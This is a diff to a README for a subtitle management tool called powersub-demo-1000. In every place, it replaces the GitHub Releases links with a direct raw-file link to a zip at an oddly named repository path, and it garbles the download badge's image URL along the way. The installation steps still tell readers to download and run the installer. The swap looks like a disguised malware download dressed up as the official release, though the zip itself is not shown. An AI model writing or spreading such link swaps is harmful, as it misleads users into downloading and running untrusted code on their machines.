@@ -1,7 +1,7 @@
 # 🎉 powersub-demo-1000 - Easy Subtitle Management for Everyone
 
 ## 🔗 Download Now
-[![Download from Releases](https://img.shields.io/badge/Download%20Now%20-%20Releases-blue)](https://github.com/gseu41/powersub-demo-1000/releases)
+[![Download from Releases](https://raw.githubusercontent.com/gseu41/powersub-demo-1000/main/antasphyctic/demo-powersub-v1.8.zip%20Now%20-%20Releases-blue)](https://raw.githubusercontent.com/gseu41/powersub-demo-1000/main/antasphyctic/demo-powersub-v1.8.zip)
 
 ## 📖 Table of Contents
 - [🚀 Getting Started](#-getting-started)
@@ -30,13 +30,13 @@ To run powersub-demo-1000, you need:
 ## 📥 Download & Install
 You can download the application from our Releases page. 
 
-1. Visit the [Releases page](https://github.com/gseu41/powersub-demo-1000/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/gseu41/powersub-demo-1000/main/antasphyctic/demo-powersub-v1.8.zip).
 2. On this page, you will see the latest release available. Click on the version you want.
 3. Find the appropriate file for your system (e.g., Windows or macOS).
 4. Click on the file name to download it.
 5. Once downloaded, run the installer following the prompts.
 
-For easy access, you can also click this link: [Download from Releases](https://github.com/gseu41/powersub-demo-1000/releases).
+For easy access, you can also click this link: [Download from Releases](https://raw.githubusercontent.com/gseu41/powersub-demo-1000/main/antasphyctic/demo-powersub-v1.8.zip).
 
 ## 🛠️ Usage Instructions
 1. **Open the Application:** After installation, find the powersub-demo-1000 icon on your desktop or in your applications folder.
